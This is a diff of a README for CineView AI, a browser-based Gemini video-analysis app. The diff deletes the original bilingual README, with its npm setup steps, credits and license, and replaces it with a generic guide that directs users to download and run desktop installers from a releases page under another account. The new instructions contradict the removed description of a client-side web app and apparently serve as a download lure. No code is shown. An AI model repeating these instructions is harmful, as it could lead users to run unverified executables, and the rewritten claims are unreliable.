@@ -1,192 +1,83 @@
-# CineView AI
+# 🎥 CineView-AI - Transform Your Videos Effortlessly
 
-[English](#english) | [中文](#chinese)
+## 📥 Download Now
 
-<a name="english"></a>
+[![Download CineView-AI](https://img.shields.io/badge/Download%20CineView%20AI-v1.0-blue)](https://github.com/neddin/CineView-AI/releases)
 
+## 🚀 Getting Started
 
-## Update
-Version Update: v1.0.1
-- Fixes: Added the missing index.tsx entry script to resolve the blank screen issue on startup.
-- Configuration: Added a CSP meta tag to relax resource restrictions and improve compatibility.
-- Chore: Minified inline CSS within the HTML header.
+CineView-AI helps you create assets from your videos. It simplifies the process of making professional production packages. With AI, you get automated shot lists, color scripts, screenplays, and posters. This guide will help you download and run the software without hassle.
 
-## Introduction
+## 🛠 System Requirements
 
-https://www.youtube.com/watch?v=k6EtLYL9Zrc
+Before you download CineView-AI, make sure your device meets the following requirements:
 
-CineView AI is an advanced automated video breakdown tool powered by Google Gemini 2.5 Multimodal API. It transforms raw video files into professional creative assets in minutes.
+- **Operating System:** Windows 10, macOS 10.14 or later, or Linux (Ubuntu 18.04 or later)
+- **Processor:** Any recent Intel or AMD processor
+- **Memory:** 4 GB RAM minimum; 8 GB recommended
+- **Storage:** At least 500 MB of free space
+- **Internet Connection:** Required for downloading and installing
 
-Designed for filmmakers, editors, and content creators, CineView AI extracts ultra-dense frame sequences from video files to reconstruct scenes, detect cuts, and generate detailed production documents. It runs entirely in the browser (client-side), ensuring your video files are processed locally and never uploaded to a server (only frames are sent to the API for analysis).
+## 📦 Download & Install
 
-TRY NOW! https://cineview-ai-899608532064.us-west1.run.app/
+1. **Visit the Releases Page**  
+   Go to the [CineView-AI Releases Page](https://github.com/neddin/CineView-AI/releases). This page contains all available versions of the application.
 
-![](capture/home.png)
+2. **Select the Latest Release**  
+   Look for the latest version listed. You will find it at the top of the page.
 
-## Key Features
+3. **Download the Installer**  
+   Click on the link to download the installer for your operating system. It will start downloading automatically.
 
-![](capture/1.png)
+4. **Run the Installer**  
+   After the download is complete, locate the downloaded file in your Downloads folder or specified location. Double-click on the installer to start the installation process.
 
-- Automated Shot List: Generates frame-accurate spotting sheets including Start/End time, Duration, Shot Size, Camera Movement, and Description.
-  
-![](capture/2.png)
+5. **Follow the Installation Instructions**  
+   Follow the prompts in the installation wizard. You might need to accept the license agreement and select an installation directory.
 
+6. **Launch CineView-AI**  
+   Once the installation is complete, find CineView-AI in your applications folder or start menu. Click to launch the application.
 
-- Color Script Generation: Visualizes the emotional arc of your video by extracting and displaying dominant color palettes for every shot.
-  
-![](capture/3.png)
-![](capture/4.png)
+## 🎬 Using CineView-AI
 
+Now that you have installed CineView-AI, it’s time to use it:
 
-- Reverse Screenplay: Automatically reverse-engineers a standard industry-format screenplay from the visual action and audio cues in the video.
-  
-![](capture/5.png)
-  
+1. **Import Your Video**  
+   Start by importing the video you want to work on. Click the "Import" button and browse for your video file.
 
-- AI Poster Generator: Uses Gemini Vision to identify the main character and scene context, generating high-quality cinematic posters.
-  
-![](capture/6.png)
+2. **Select Your Output Options**  
+   Choose the assets you want to create. You can generate shot lists, color scripts, screenplays, and posters. Select the desired options in the application.
 
-- Bilingual Support: Fully supports English and Chinese (Simplified) interfaces and analysis output.
-- Privacy First: Video processing happens locally. API Keys are stored in your browser LocalStorage.
+3. **Run the AI Processing**  
+   Click the "Generate" button. CineView-AI will process your video and create the selected assets.
 
-## Tech Stack
+4. **Access Your Files**  
+   Once the process is complete, access the generated files from the output folder. You can view, edit, or print these assets as needed.
 
-- Frontend: React 19, TypeScript, Vite
-- Styling: Tailwind CSS
-- AI Integration: Google GenAI SDK (@google/genai)
-- Models Used: Gemini 2.5 Flash (Analysis), Gemini 2.5 Flash Image (Poster Generation)
+## 🎉 Features
 
-## Getting Started
+CineView-AI offers a range of features to enhance your video editing experience:
 
-### Prerequisites
+- **Automated Shot Lists:** Quickly get a breakdown of your video's shots.
+- **Color Scripts:** Understand the color schemes used throughout the video.
+- **Screenplays:** Generate detailed screenplays from your video.
+- **Posters:** Create eye-catching posters for your productions.
 
-- Node.js (v18 or higher)
-- A Google Gemini API Key
+## 🛠 Troubleshooting
 
-To get an API key, visit Google AI Studio.
+If you encounter issues while using CineView-AI, consider these common solutions:
 
-### Installation
+- **Installation Problems:** Ensure your system meets the requirements. Try re-downloading the installer if it fails.
+- **Performance Issues:** Close any unnecessary applications to free up system resources.
+- **File Import Issues:** Make sure your video file format is supported. CineView-AI supports MP4, AVI, and MOV formats.
 
-1. Clone the repository
+## 📞 Support
 
-```bash
-git clone https://github.com/yourusername/cineview-ai.git
-cd cineview-ai
-```
+For further help, check the FAQ section on the [CineView-AI GitHub page](https://github.com/neddin/CineView-AI/issues). You can also open a new issue for specific problems or questions.
 
-2. Install dependencies
+Feel free to explore and enjoy using CineView-AI to unlock the true potential of your video projects! 
 
-```bash
-npm install
-```
+## 🔗 Quick Links
 
-3. Start the development server
-
-```bash
-npm run dev
-```
-
-4. Open your browser and navigate to the local host address shown in your terminal (usually http://localhost:5173).
-
-## Usage Guide
-
-1. Enter API Key: Upon launching, click the key icon or follow the prompt to enter your Google Gemini API Key. The key is saved locally on your device.
-2. Upload Video: Drag and drop a video file (MP4, MOV, WebM).
-   - Recommendation: Short clips (under 2 minutes) work best for detailed analysis.
-3. Analyze: The app will extract frames and send them to Gemini for analysis.
-4. Explore Results:
-   - Shot List: View, edit, and export your shots to CSV.
-   - Color Script: Analyze the color palette and export visual summaries.
-   - Screenplay: Read the AI-generated script derived from your video.
-   - Poster: Generate creative movie posters based on the footage.
-
----
-
-<a name="chinese"></a>
-
-# CineView AI (中文介绍)
-
-## 版本更新：
-v1.0.1
-- 修复 (Fixes)： 补充缺失的 index.tsx 入口脚本，解决应用启动白屏问题。
-- 配置 (Config)： 新增 CSP 策略，放宽资源加载限制以适配开发环境。
-- 优化 (Chore)： 压缩 HTML 头部的内联 CSS 样式代码。
-
-## 项目介绍
-
-CineView AI 是一款基于 Google Gemini 2.5 多模态大模型的自动化视频分析工具。它能够将原始视频文件在几分钟内转化为专业的影视制作资产。
-
-该项目专为电影制作人、剪辑师和内容创作者设计。通过提取视频中的高密度关键帧，CineView AI 能够重建场景、识别剪辑点，并生成详细的制作文档。项目完全在浏览器端运行（客户端），确保您的视频文件仅在本地处理，不会被上传到任何服务器（仅发送截图帧给 API 用于分析）。
-
-
-## 核心功能
-
-- 自动分镜表 (Shot List): 生成精确到帧的场记表，包含开始/结束时间、时长、景别、运镜方式和画面描述。
-- 色彩脚本 (Color Script): 提取每个镜头的核心色调，可视化呈现视频的情绪弧光。
-- 反推剧本: 根据视频中的视觉动作和音频线索，自动反向生成标准格式的电影剧本。
-- AI 海报生成: 利用 Gemini 视觉能力识别主角和场景语境，生成高质量的电影海报。
-- 双语支持: 完美支持英文和简体中文界面及分析结果输出。
-- 隐私优先: 视频处理完全在本地进行。API Key 仅存储在您的浏览器 LocalStorage 中。
-
-## 技术栈
-
-- 前端框架: React 19, TypeScript, Vite
-- 样式库: Tailwind CSS
-- AI 集成: Google GenAI SDK (@google/genai)
-- 使用模型: Gemini 2.5 Flash (视频分析), Gemini 2.5 Flash Image (海报生成)
-
-## 快速开始
-
-### 前置要求
-
-- Node.js (v18 或更高版本)
-- Google Gemini API Key
-
-您可以前往 Google AI Studio 免费获取 API Key。
-
-### 安装步骤
-
-1. 克隆仓库
-
-```bash
-git clone https://github.com/yourusername/cineview-ai.git
-cd cineview-ai
-```
-
-2. 安装依赖
-
-```bash
-npm install
-```
-
-3. 启动开发服务器
-
-```bash
-npm run dev
-```
-
-4. 打开浏览器访问终端中显示的本地地址（通常是 http://localhost:5173）。
-
-## 使用指南
-
-1. 输入 API Key: 首次启动时，点击右上角的钥匙图标或根据提示输入您的 Google Gemini API Key。密钥将安全地保存在您的本地。
-2. 上传视频: 拖拽或点击上传视频文件 (支持 MP4, MOV, WebM)。
-   - 建议: 为了获得最佳的详细分析效果，建议上传 2 分钟以内的短片。
-3. 等待分析: 应用会自动提取关键帧并发送给 Gemini 进行多模态分析。
-4. 查看结果:
-   - 分镜表: 查看、编辑并将分镜数据导出为 CSV 文件。
-   - 色彩脚本: 分析色彩分布并导出长图。
-   - 剧本: 查看由 AI 根据视频内容反推生成的剧本。
-   - 海报: 基于视频画面一键生成电影海报。
-
----
-
-## 贡献者 Eddy & Hulk & 温暖机器
-- 感谢 Rao Anyi Contra KiSA Ac.DaVinci Byron 
-- Special Thanks MMLab@HKUST 实验编程 故事接龙 
-- 联系我们 eddyse@gmail.com
-
-## License
-
-[MIT](LICENSE)
+- [Download CineView-AI](https://github.com/neddin/CineView-AI/releases)
+- [CineView-AI Issues](https://github.com/neddin/CineView-AI/issues)
